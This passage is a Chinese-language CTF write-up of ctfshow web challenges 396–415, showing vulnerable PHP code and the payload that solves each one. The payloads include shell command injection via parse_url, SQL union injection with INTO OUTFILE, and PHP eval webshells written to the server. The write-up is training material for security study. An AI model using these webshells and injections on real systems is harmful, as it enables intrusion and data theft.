e<br>3: n<br>...<br>24: _  # 对应 &quot;select_or_reject&quot; 中的下划线<br>.pop(24) 提取索引 24 的字符，即 _。<br>所以得到了a=_<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">pop()  用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。<br></code></pre></td></tr></table></figure>
+
+<h2 id="特定函数绕过"><a href="#特定函数绕过" class="headerlink" title="特定函数绕过"></a>特定函数绕过</h2><h3 id="web396"><a href="#web396" class="headerlink" title="web396"></a>web396</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>if(isset($_GET[&#x27;url&#x27;]))&#123;<br>    $url = parse_url($_GET[&#x27;url&#x27;]);  #检测url结构  我们能用;截断后加东西<br>    shell_exec(&#x27;echo &#x27;.$url[&#x27;host&#x27;].&#x27;&gt; &#x27;.$url[&#x27;path&#x27;]);<br><br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?url=127.0.0.1/1;cat fl0g.php &gt; 1.txt #重定向<br></code></pre></td></tr></table></figure>
+
+<p>解释一下这个parse_url,然后代码就比较容易看懂了</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>$url = &#x27;http://username:password@hostname/path?arg=value#anchor&#x27;;<br>print_r(parse_url($url));<br>echo parse_url($url, PHP_URL_PATH);<br>?&gt;  <br><br>以上例程会输出：<br>Array<br>(<br>    [scheme] =&gt; http<br>    [host] =&gt; hostname<br>    [user] =&gt; username<br>    [pass] =&gt; password<br>    [path] =&gt; /path<br>    [query] =&gt; arg=value<br>    [fragment] =&gt; anchor<br>)<br>/path<br></code></pre></td></tr></table></figure>
+
+<h3 id="web397"><a href="#web397" class="headerlink" title="web397"></a>web397</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>if(isset($_GET[&#x27;url&#x27;]))&#123;<br>    $url = parse_url($_GET[&#x27;url&#x27;]);<br>    shell_exec(&#x27;echo &#x27;.$url[&#x27;host&#x27;].&#x27;&gt; /tmp/&#x27;.$url[&#x27;path&#x27;]);<br><br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>一样能用 <code>?url=127.0.0.1/1;cat fl0g.php &amp;gt; 1.txt</code></p>
+<h3 id="web398"><a href="#web398" class="headerlink" title="web398"></a>web398</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>if(isset($_GET[&#x27;url&#x27;]))&#123;<br>    $url = parse_url($_GET[&#x27;url&#x27;]);<br>    if(!preg_match(&#x27;/;/&#x27;, $url[&#x27;host&#x27;]))&#123;<br>        shell_exec(&#x27;echo &#x27;.$url[&#x27;host&#x27;].&#x27;&gt; /tmp/&#x27;.$url[&#x27;path&#x27;]);<br>    &#125;<br><br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">过滤了;   <br>我们还能用|<br>?url=127.0.0.1/1|cat fl0g.php &gt; 1.txt<br></code></pre></td></tr></table></figure>
+
+<h3 id="web399"><a href="#web399" class="headerlink" title="web399"></a>web399</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>if(isset($_GET[&#x27;url&#x27;]))&#123;<br>    $url = parse_url($_GET[&#x27;url&#x27;]);<br>    if(!preg_match(&#x27;/;|&gt;/&#x27;, $url[&#x27;host&#x27;]))&#123;<br>        shell_exec(&#x27;echo &#x27;.$url[&#x27;host&#x27;].&#x27;&gt; /tmp/&#x27;.$url[&#x27;path&#x27;]);<br>    &#125;<br><br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">才发现，检测的是host里面的;和&gt;<br>?url=127.0.0.1/1;cat f* &gt; 1.txt<br></code></pre></td></tr></table></figure>
+
+<h3 id="web400"><a href="#web400" class="headerlink" title="web400"></a>web400</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>if(isset($_GET[&#x27;url&#x27;]))&#123;<br>    $url = parse_url($_GET[&#x27;url&#x27;]);<br>    if(!preg_match(&#x27;/;|&gt;|http|https/i&#x27;, $url[&#x27;host&#x27;]))&#123;<br>        shell_exec(&#x27;echo &#x27;.$url[&#x27;host&#x27;].&#x27;&gt; /tmp/&#x27;.$url[&#x27;path&#x27;]);<br>    &#125;<br><br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">过滤了http和https，但我们好像压根没用上这两<br>?url=127.0.0.1/1;cat f* &gt;1.txt<br></code></pre></td></tr></table></figure>
+
+<h3 id="web401"><a href="#web401" class="headerlink" title="web401"></a>web401</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>if(isset($_GET[&#x27;url&#x27;]))&#123;<br>    $url = parse_url($_GET[&#x27;url&#x27;]);<br>    var_dump($url);<br>    if(!preg_match(&#x27;/;|&gt;|http|https|\|/i&#x27;, $url[&#x27;host&#x27;]))&#123;<br>        shell_exec(&#x27;echo &#x27;.$url[&#x27;host&#x27;].&#x27;&gt; /tmp/&#x27;.$url[&#x27;path&#x27;]);<br>    &#125;<br><br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?url=127.0.0.1/1;cat f* &gt;1.txt<br></code></pre></td></tr></table></figure>
+
+<h3 id="web402"><a href="#web402" class="headerlink" title="web402"></a>web402</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>if(isset($_GET[&#x27;url&#x27;]))&#123;<br>    $url = parse_url($_GET[&#x27;url&#x27;]);<br>    var_dump($url);<br>    if(preg_match(&#x27;/http|https/i&#x27;, $url[&#x27;scheme&#x27;]))&#123;<br>        die(&#x27;error&#x27;);<br>    &#125;<br>    if(!preg_match(&#x27;/;|&gt;|\||base/i&#x27;, $url[&#x27;host&#x27;]))&#123;<br>        shell_exec(&#x27;echo &#x27;.$url[&#x27;host&#x27;].&#x27;&gt; /tmp/&#x27;.$url[&#x27;path&#x27;]);<br>    &#125;<br><br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?url=127.0.0.1/1;cat f* &gt;1.txt<br></code></pre></td></tr></table></figure>
+
+<h3 id="web403"><a href="#web403" class="headerlink" title="web403"></a>web403</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>if(isset($_GET[&#x27;url&#x27;]))&#123;<br>    $url = parse_url($_GET[&#x27;url&#x27;]);<br>    if(preg_match(&#x27;/^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)$/&#x27;, $url[&#x27;host&#x27;]))&#123;<br>        shell_exec(&#x27;curl &#x27;.$url[&#x27;scheme&#x27;].$url[&#x27;host&#x27;].$url[&#x27;path&#x27;]);<br>    &#125;<br><br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">加了个$url[&#x27;scheme&#x27;]那我们要加个头才行了<br>if(preg_match(&#x27;/^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)$/&#x27;, $url[&#x27;host&#x27;]))&#123;<br>        shell_exec(&#x27;curl &#x27;.$url[&#x27;scheme&#x27;].$url[&#x27;host&#x27;].$url[&#x27;path&#x27;]);<br>    &#125;<br>这个是对于ip的检测，严格验证host是否为合法的IPv4地址（如 192.168.1.1）<br>那我们其实加个头就行了<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?url=http://127.0.0.1/1;cat f* &gt;1.txt<br></code></pre></td></tr></table></figure>
+
+<h3 id="web404"><a href="#web404" class="headerlink" title="web404"></a>web404</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">打不开<br></code></pre></td></tr></table></figure>
+
+<h3 id="web405"><a href="#web405" class="headerlink" title="web405"></a>web405</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>if(isset($_GET[&#x27;url&#x27;]))&#123;<br>    $url = parse_url($_GET[&#x27;url&#x27;]);<br>    if(preg_match(&#x27;/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)./&#x27;, $url[&#x27;host&#x27;]))&#123;<br>        if(preg_match(&#x27;/^\/[A-Za-z0-9]+$/&#x27;, $url[&#x27;path&#x27;]))&#123;<br>            if(preg_match(&#x27;/~|\.|php/&#x27;, $url[&#x27;scheme&#x27;]))&#123;<br>                shell_exec(&#x27;curl &#x27;.$url[&#x27;scheme&#x27;].$url[&#x27;host&#x27;].$url[&#x27;path&#x27;]);<br>            &#125;<br>            <br>        &#125;<br>    &#125;<br><br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>    echo &#x27;parse_url 好强大&#x27;;<br>&#125;<br>parse_url 好强大<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">host为有效ip,scheme需要包含~或者.或者php,path以/开头并且只包括字母数字<br>?url=http.://127.0.0.1;cat f* &gt;1.txt;/1<br></code></pre></td></tr></table></figure>
+
+<h3 id="web406"><a href="#web406" class="headerlink" title="web406"></a>web406</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>require &#x27;config.php&#x27;;<br>//flag in db<br>highlight_file(__FILE__);<br>$url=$_GET[&#x27;url&#x27;];<br>if(filter_var ($url,FILTER_VALIDATE_URL))&#123;<br>    $sql = &quot;select * from links where url =&#x27;&#123;$url&#125;&#x27;&quot;;<br>    $result = $conn-&gt;query($sql);<br>&#125;else&#123;<br>    echo &#x27;不通过&#x27;;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">这题有点麻烦FILTER_VALIDATE_URL这个检测的是url的格式正不正确<br>$result = $conn-&gt;query($sql);执行sql语句<br>有两个方法把联合注入和写🐎<br>用这个写入查看回显，/into/**/outfile/**/&#x27;/var/www/html/1.txt&#x27;%23<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs text">1.union<br>爆数据库<br>url=http://127.0.0.1/index.php&#x27;union/**/select/**/1,group_concat(schema_name)/**/from/**/information_schema.schemata/**/into/**/outfile/**/&#x27;/var/www/html/2.txt&#x27;%23<br><br>爆表 在当前数据库看到flag的表 url=http://127.0.0.1/index.php&#x27;union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/into/**/outfile/**/&#x27;/var/www/html/3.txt&#x27;%23<br><br>爆字段 发现flag表中有三个字段，flag,id,url url=http://127.0.0.1/index.php&#x27;union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/into/**/outfile/**/&#x27;/var/www/html/4.txt&#x27;%23<br><br>拿flag<br>url=http://127.0.0.1/index.php&#x27;union/**/select/**/1,flag/**/from/**/flag/**/into/**/outfile/**/&#x27;/var/www/html/5.txt&#x27;%23<br><br>2.写🐎<br>url=http://127.0.0.1/index.php&#x27;union/**/select/**/1,0x3c3f3d2f2a2a2f406576616c28245f504f53545b636d645d293b3f3e/**/into/**/outfile/**/&#x27;/var/www/html/1.php&#x27;%23<br>&lt;?=/**/@eval($_POST[cmd]);?&gt;<br>写🐎半天没找到flag。。。<br></code></pre></td></tr></table></figure>
+
+<h3 id="web407"><a href="#web407" class="headerlink" title="web407"></a>web407</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>highlight_file(__FILE__);<br>error_reporting(0);<br>$ip=$_GET[&#x27;ip&#x27;];<br><br>if(filter_var ($ip,FILTER_VALIDATE_IP))&#123;<br>    call_user_func($ip);<br>&#125;<br><br>class cafe&#123;<br>    public static function add()&#123;<br>        echo file_get_contents(&#x27;flag.php&#x27;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">FILTER_VALIDATE_IP支持检测<br>IPv4：192.168.1.1<br>IPv6：2001:0db8:85a3:0000:0000:8a2e:0370:7334<br>压缩格式 IPv6：2001:db8::8a2e:370:7334<br>又因为静态函数调用可以care::add<br>就等于care:0:0:0:0:0:0:add<br>所以能调用函数<br></code></pre></td></tr></table></figure>
+
+<h3 id="web408"><a href="#web408" class="headerlink" title="web408"></a>web408</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>highlight_file(__FILE__);<br>error_reporting(0);<br>$email=$_GET[&#x27;email&#x27;];<br><br>if(filter_var ($email,FILTER_VALIDATE_EMAIL))&#123;<br>    file_put_contents(explode(&#x27;@&#x27;, $email)[1], explode(&#x27;@&#x27;, $email)[0]);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">file_put_contents — 将一个字符串写入文件<br>?email=&quot;&lt;?=eval($_POST[1]);?&gt;&quot;@1.php<br>很奇怪的一个性质<br>双引号包裹可以绕过检测<br></code></pre></td></tr></table></figure>
+
+<h3 id="web409"><a href="#web409" class="headerlink" title="web409"></a>web409</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>highlight_file(__FILE__);<br>error_reporting(0);<br>$email=$_GET[&#x27;email&#x27;];<br>if(filter_var ($email,FILTER_VALIDATE_EMAIL))&#123;<br>    $email=preg_replace(&#x27;/.flag/&#x27;, &#x27;&#x27;, $email);<br>    eval($email);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text">我们这题要换换思维了<br>首先我们要通过FILTER_VALIDATE_EMAIL<br>然后执行eval<br>我捣鼓半天&quot;system(&#x27;id&#x27;);&quot;@abcd.com，突然意识到有@123.php好像整不了<br>然后想到了闭合&quot;system(&#x27;id&#x27;);?&gt;&quot;@abcd.com,还是执行不了<br>看看wp前面要加个flag？&quot;flagsystem(&#x27;id&#x27;);?&gt;&quot;@abcd.com  #应该是要经过preg_replace替换把前面的&quot;也替换掉<br>有回显了但是ls /没有回显<br>蒜鸟蒜鸟写🐎吧<br>?email=&quot;flageval($_POST[1]);?&gt;&quot;@abcd.com<br>1=system(&quot;cat /f*&quot;);<br></code></pre></td></tr></table></figure>
+
+<h3 id="web410"><a href="#web410" class="headerlink" title="web410"></a>web410</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>highlight_file(__FILE__);<br>error_reporting(0);<br>include(&#x27;flag.php&#x27;);<br>$b=$_GET[&#x27;b&#x27;];<br>if(filter_var ($b,FILTER_VALIDATE_BOOLEAN))&#123;<br>    if($b==&#x27;true&#x27; || intval($b)&gt;0)&#123;<br>        die(&#x27;FLAG NOT HERE&#x27;);<br>    &#125;else&#123;<br>        echo $flag;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">FILTER_VALIDATE_BOOLEAN 是 PHP 中用于验证布尔值的过滤器（常与 filter_var() 或 filter_input() 配合使用）。它的核心功能是将符合特定规则的字符串/数字转换为真正的布尔值 true 或 false。<br>验证规则<br>输入值	返回值	说明<br>true, 1, &quot;1&quot;	true	真值<br>&quot;true&quot;, &quot;on&quot;, &quot;yes&quot;	true	不区分大小写（如 &quot;YES&quot; 也有效）<br>false, 0, &quot;0&quot;	false	假值<br>&quot;false&quot;, &quot;off&quot;, &quot;no&quot;, &quot;&quot;	false	空字符串 &quot;&quot; 也被视为假值<br>其他值（如 &quot;abc&quot;, 2, null）	false	默认行为：无效值返回 false<br>其他值 + FILTER_NULL_ON_FAILURE	null	严格模式下无效值返回 null<br><br>又因为<br>对于b是弱比较，我们直接b=Ture就ok了<br></code></pre></td></tr></table></figure>
+
+<h3 id="web411"><a href="#web411" class="headerlink" title="web411"></a>web411</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>highlight_file(__FILE__);<br>error_reporting(0);<br>include(&#x27;flag.php&#x27;);<br>$b=$_GET[&#x27;b&#x27;];<br>if(filter_var ($b,FILTER_VALIDATE_BOOLEAN))&#123;<br>    if($b==&#x27;true&#x27; || intval($b)&gt;0 ||$b==&#x27;on&#x27; || $b==&#x27;ON&#x27;)&#123;<br>        die(&#x27;FLAG NOT HERE&#x27;);<br>    &#125;else&#123;<br>        echo $flag;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">b=True还是ok<br></code></pre></td></tr></table></figure>
+
+<h3 id="web412"><a href="#web412" class="headerlink" title="web412"></a>web412</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>highlight_file(__FILE__);<br><br>$ctfshow=$_POST[&#x27;ctfshow&#x27;];<br><br>if(isset($ctfshow))&#123;<br>    file_put_contents(&#x27;flag.php&#x27;, &#x27;//&#x27;.$ctfshow,FILE_APPEND);<br>    include(&#x27;flag.php&#x27;);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>我们看到</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">file_put_contents(&#x27;flag.php&#x27;, &#x27;//&#x27;.$ctfshow,FILE_APPEND);<br>在文件末尾追加//和$ctfshow<br>我们能用换行绕过%0a,或者闭合?&gt;<br>ctfshow=%0asystem(&quot;cat f*&quot;);<br>ctfshow=?&gt;&lt;?php system(&quot;cat f*&quot;);?&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="web413"><a href="#web413" class="headerlink" title="web413"></a>web413</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>highlight_file(__FILE__);<br><br>$ctfshow=$_POST[&#x27;ctfshow&#x27;];<br><br>if(isset($ctfshow))&#123;<br>        file_put_contents(&#x27;flag.php&#x27;, &#x27;/*&#x27;.$ctfshow.&#x27;*/&#x27;,FILE_APPEND);<br>    include(&#x27;flag.php&#x27;);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">ctfshow=*/system(&#x27;cat flag.php&#x27;);/*<br></code></pre></td></tr></table></figure>
+
+<h3 id="web414"><a href="#web414" class="headerlink" title="web414"></a>web414</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>highlight_file(__FILE__);<br>include(&#x27;flag.php&#x27;);<br>$ctfshow=$_GET[&#x27;ctfshow&#x27;];<br><br>if($ctfshow==true)&#123;<br>    if(sqrt($ctfshow)&gt;=sqrt(intval($flag)))&#123;<br>        echo &#x27;FLAG_NOT_HERE&#x27;;<br>    &#125;else&#123;<br>        echo $flag;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">主要注意到这里sqrt($ctfshow)&gt;=sqrt(intval($flag)<br>我们要让其为假，<br>sqrt()<br>负数平方根 = NaN（非数字）<br>NaN 与任何数字比较都返回 false<br>sqrt(-1) &gt;= sqrt(...) → false → 进入 else 分支<br>所以我们只需要ctfshow=-1<br></code></pre></td></tr></table></figure>
+
+<h3 id="web415"><a href="#web415" class="headerlink" title="web415"></a>web415</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br><br>$k = $_GET[k];<br><br>function getflag()&#123;<br>    echo file_get_contents(&#x27;flag.php&#x27;);<br>&#125;<br><br>if($k==&#x27;getflag&#x27;)&#123;<br>    die(&#x27;FLAG_NOT_HERE&#x27;);<br>&#125;else&#123;<br>    call_user_func($k);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">两种方法大小写绕过和/<br>?k=Getflag<br>?k=\getflag<br>在名称前加上前缀\表示该名称是全局空间中的名称，如果没有定义任何命名空间，所有的类与函数的定义都是在全局空间，与 PHP 引入命名空间概念前一样。\getflag()与getflag()指代的是同一个函数<br></code></pre></td></tr></table></figure>
+
